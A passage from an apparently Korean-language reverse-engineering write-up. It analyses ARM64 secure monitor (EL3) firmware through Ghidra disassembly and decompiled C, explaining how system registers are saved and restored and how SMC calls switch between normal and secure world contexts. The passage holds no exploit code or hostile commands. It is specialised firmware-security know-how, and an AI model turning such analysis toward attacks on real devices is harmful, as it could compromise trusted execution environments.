</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e18</span> <span style="color:#ae81ff">0</span>a  <span style="color:#ae81ff">2</span>c  <span style="color:#ae81ff">03</span>  a9    stp        x10 ,x11 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x30</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e1</span>c <span style="color:#ae81ff">0</span>c  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x12 ,ttbr0_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e20</span> <span style="color:#ae81ff">2</span>d  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x13 ,ttbr1_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e24</span> <span style="color:#ae81ff">0</span>c  <span style="color:#ae81ff">34</span>  <span style="color:#ae81ff">04</span>  a9    stp        x12 ,x13 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x40</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e28</span> <span style="color:#ae81ff">0</span>e  a2  <span style="color:#ae81ff">38</span>  d5    mrs        x14 ,mair_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e2</span>c <span style="color:#ae81ff">0f</span>  a3  <span style="color:#ae81ff">38</span>  d5    mrs        x15 ,amair_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e30</span> <span style="color:#ae81ff">0</span>e  <span style="color:#ae81ff">3</span>c  <span style="color:#ae81ff">05</span>  a9    stp        x14 ,x15 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x50</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e34</span> <span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x16 ,tcr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e38</span> <span style="color:#ae81ff">91</span>  d0  <span style="color:#ae81ff">38</span>  d5    mrs        x17 ,tpidr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e3</span>c <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">06</span>  a9    stp        x16 ,x17 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x60</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e40</span> <span style="color:#ae81ff">49</span>  d0  <span style="color:#ae81ff">3</span>b  d5    mrs        x9,tpidr_el0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e44</span> <span style="color:#ae81ff">6</span>a  d0  <span style="color:#ae81ff">3</span>b  d5    mrs        x10 ,tpidrro_el0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e48</span> <span style="color:#ae81ff">09</span>  <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">07</span>  a9    stp        x9,x10 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x70</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e4</span>c <span style="color:#ae81ff">0</span>d  <span style="color:#ae81ff">74</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x13 ,par_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e50</span> <span style="color:#ae81ff">0</span>e  <span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x14 ,far_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e54</span> <span style="color:#ae81ff">0</span>d  <span style="color:#ae81ff">38</span>  <span style="color:#ae81ff">08</span>  a9    stp        x13 ,x14 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x80</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e58</span> <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">51</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x15 ,afsr0_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e5</span>c <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">51</span>  <span style="color:#ae81ff">38</span>  d5    mrs        x16 ,afsr1_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e60</span> <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">09</span>  a9    stp        x15 ,x16 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x90</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e64</span> <span style="color:#ae81ff">31</span>  d0  <span style="color:#ae81ff">38</span>  d5    mrs        x17 ,contextidr_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e68</span> <span style="color:#ae81ff">09</span>  c0  <span style="color:#ae81ff">38</span>  d5    mrs        x9,vbar_el1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e6</span>c <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">0</span>a  a9    stp        x17 ,x9,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xa0</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e70</span> <span style="color:#ae81ff">0</span>a  <span style="color:#ae81ff">9</span>c  <span style="color:#ae81ff">3</span>b  d5    mrs        x10 ,pmcr_el0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e74</span> <span style="color:#ae81ff">0</span>a  <span style="color:#ae81ff">58</span>  <span style="color:#ae81ff">00</span>  f9    str        x10 ,[x0, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xb0</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000e78</span> c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>아마 SEL2는 구현되지 않아서 최대 EL1까지의 레지스터만 저장하는 것으로 보인다.</p>
<p>전에 trustzone 구현 메뉴얼을 살펴봤다.
그때 SCR_EL3.NS를 반전시켜 non-secure과 secure 전환을 한다고 했었는데, 그전에 이렇게 system register의 save/load가 필요했다
그렇다면 이런 save 함수가 있으니 이는 secure world 진입 직전일 것이고, 당연히 stack context 복구나 saved system registers를 다시 restore하는 함수도 있을 것임을 알 수 있다.
이런 구조를 염두에 두고 분석하면 쉽게 분석할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FUN_00000330</span>(uint x0,<span style="color:#66d9ef">long</span> x1,undefined8 x2,undefined8 x3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>plVar2;
</span></span><span style="display:flex;"><span>  ulong non_secure;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_00000254</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((non_secure <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x83000002</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000007</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">save_el1_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        plVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">get_secure_mem</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>plVar2 <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> plVar2;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_00000d28</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">do_panic</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* tee os initialized */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_log</span>(<span style="color:#f92672">&amp;</span>DAT_00001910);
</span></span><span style="display:flex;"><span>    _is_booted <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    _DAT_0e002420 <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">save_el1_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    plVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">get_secure_mem</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>plVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* save non-secure system register */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">save_el1_sysregs</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (x0 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x83000001</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (_is_booted <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        plVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">get_secure_mem</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>plVar2 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> plVar2;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_0000025c</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">FUN_000002c8</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00000b2c</span>(<span style="color:#ae81ff">0</span>,_DAT_0e002420 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x1d3</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">restore_sysregs</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">set_spelx</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002468</span>) <span style="color:#f92672">=</span> x3;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002460</span>) <span style="color:#f92672">=</span> x2;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002458</span>) <span style="color:#f92672">=</span> x1;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(ulong <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002450</span>) <span style="color:#f92672">=</span> (ulong)x0;
</span></span><span style="display:flex;"><span>    plVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(uVar1 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x220</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe002450</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> plVar2;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>x0 == 0x83000001는 딱봐도 secure → normal이고 아래가 normal → secure이다.
그 위 부분들은 secure world에서 호출시에만 동작하니 일단 생략한다.
위 함수가 호출되기 전에 조금 흥미로운 작업을 수행한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>                             LAB_00002800                                    XREF[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>     <span style="color:#ae81ff">00002414</span> (j) , <span style="color:#ae81ff">00002614</span> (j)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">800</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">80</span>  d2    mov        param_1 ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">804</span> <span style="color:#ae81ff">79</span>  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">808</span> <span style="color:#ae81ff">76</span>  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>                             sp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe002210</span> 
</span></span><span style="display:flex;"><span>                             fill out general purpose regs
</span></span><span style="display:flex;"><span>                             LAB_0000280c                                    XREF[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>     <span style="color:#ae81ff">0000241</span><span style="color:#ae81ff">8</span> (j) , <span style="color:#ae81ff">0000261</span><span style="color:#ae81ff">8</span> (j)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">80</span>c c0  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000f0c                                     undefined <span style="color:#a6e22e">FUN_00000f0c</span>(undefined
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">810</span> e5  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">1f</span>  aa    mov        param_6 ,xzr
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">814</span> e6  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        param_7 ,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">818</span> cc  <span style="color:#ae81ff">88</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x12 ,[param_7 , <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x110</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">81</span>c bf  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">820</span> <span style="color:#ae81ff">9f</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        sp,x12
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">824</span> <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x16 ,spsr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">828</span> <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x17 ,elr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">82</span>c <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x18 ,scr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">830</span> d0  c4  <span style="color:#ae81ff">11</span>  a9    stp        x16 ,x17 ,[param_7 , <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x118</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">834</span> d2  <span style="color:#ae81ff">80</span>  <span style="color:#ae81ff">00</span>  f9    str        x18 ,[x6, <span style="color:#960050;background-color:#1e0010">#</span>param_12 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">838</span> <span style="color:#ae81ff">47</span>  <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">40</span>  b3    bfxil      param_8 ,x18 ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span> ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">83</span>c <span style="color:#ae81ff">06</span>  f8  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000854                                     undefined <span style="color:#a6e22e">FUN_00000854</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">840</span> da  f9  ff  <span style="color:#ae81ff">17</span>    b          FUN_00000fa8                                     undefined <span style="color:#a6e22e">FUN_00000fa8</span>(undefined
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">--</span> Flow Override: <span style="color:#a6e22e">CALL_RETURN</span> (CALL_TERMINATOR)
</span></span></code></pre></div><p>디컴파일러에선 아예 보이지 않는데, 여기서 normal world context가 저장된 sp를 param_7(w6)에 넣고 spsr_el3, elr_el3, scr_el3를 저장한다.
PState.SP에 0을 넣고 s-el3의 특정 stack 주소를 세팅해서 동작을 이어간다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">set_spelx</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span> local_10                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     <span style="color:#ae81ff">00000</span>bb4 (W)   
</span></span><span style="display:flex;"><span>                             set_spelx                                       XREF[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">:</span>     FUN_000001f8:<span style="color:#ae81ff">00000214</span> (c) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_00000330:<span style="color:#ae81ff">000003</span><span style="color:#ae81ff">9</span>c (c) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_00000330:<span style="color:#ae81ff">00000404</span> (c) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_00000330:<span style="color:#ae81ff">000004</span><span style="color:#ae81ff">88</span> (c) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_00000330:<span style="color:#ae81ff">000004f</span><span style="color:#ae81ff">0</span> (c) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_00000bd4:<span style="color:#ae81ff">00000</span>bfc (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bb4 fd  <span style="color:#ae81ff">7</span>b  bf  a9    stp        x29 ,x30 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>local_10 ]<span style="color:#f92672">!</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bb8 fd  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        x29 ,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bbc <span style="color:#ae81ff">38</span>  ff  ff  <span style="color:#ae81ff">97</span>    bl         get_secure_mem                                   world_ctx <span style="color:#f92672">*</span> <span style="color:#a6e22e">get_secure_mem</span>(uint6
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bc0 bf  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bc4 <span style="color:#ae81ff">1f</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        sp,x0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bc8 bf  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bcc fd  <span style="color:#ae81ff">7</span>b  c1  a8    ldp        x29 ,x30 ,[sp], <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>bd0 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>여기서 sp_elxh를 세팅한다.
아까 normal world context가 sp_elxh가 가리키는 구조체였고 이전에 normal world context에 접근하나, secure world context에 접근하냐에 따라 S-EL3에 진입할 때 어떤 world context에 저장할지 결정된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">FUN_00000fa8</span> (undefined  param_1 , undefined  par
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           param_1
</span></span><span style="display:flex;"><span>             undefined         w1:<span style="color:#ae81ff">1</span>           param_2
</span></span><span style="display:flex;"><span>             undefined         w2:<span style="color:#ae81ff">1</span>           param_3
</span></span><span style="display:flex;"><span>             undefined         w3:<span style="color:#ae81ff">1</span>           param_4
</span></span><span style="display:flex;"><span>             undefined         w4:<span style="color:#ae81ff">1</span>           param_5
</span></span><span style="display:flex;"><span>             undefined         w5:<span style="color:#ae81ff">1</span>           param_6
</span></span><span style="display:flex;"><span>             undefined         w6:<span style="color:#ae81ff">1</span>           param_7
</span></span><span style="display:flex;"><span>             undefined         w7:<span style="color:#ae81ff">1</span>           param_8
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x0</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>   param_9
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x8</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>   param_10
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x110</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span> param_11                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     <span style="color:#ae81ff">00000f</span>b0 (W)   
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x120</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span> ELR_EL3
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x118</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span> SPSR_EL3                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     <span style="color:#ae81ff">00000f</span>b8 (R)   
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x100</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span> SCR_EL3                                 XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     <span style="color:#ae81ff">00000f</span>b4 (R)   
</span></span><span style="display:flex;"><span>                             FUN_00000fa8                                    XREF[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">:</span>     Reset:<span style="color:#ae81ff">000000</span>b0 (c) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_00000c90:<span style="color:#ae81ff">00000</span>cb4 (c) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_00002400:<span style="color:#ae81ff">00002</span><span style="color:#ae81ff">840</span> (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>a8 f1  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        x17 ,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>ac bf  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>b0 f1  <span style="color:#ae81ff">8</span>b  <span style="color:#ae81ff">00</span>  f9    str        x17 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_11 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>b4 f2  <span style="color:#ae81ff">83</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x18 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>SCR_EL3 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>b8 f0  c7  <span style="color:#ae81ff">51</span>  a9    ldp        x16 ,x17 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>SPSR_EL3 ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>bc <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">1</span>e  d5    msr        scr_el3 ,x18
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>c0 <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">1</span>e  d5    msr        spsr_el3 ,x16
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000f</span>c4 <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">1</span>e  d5    msr        elr_el3 ,x17
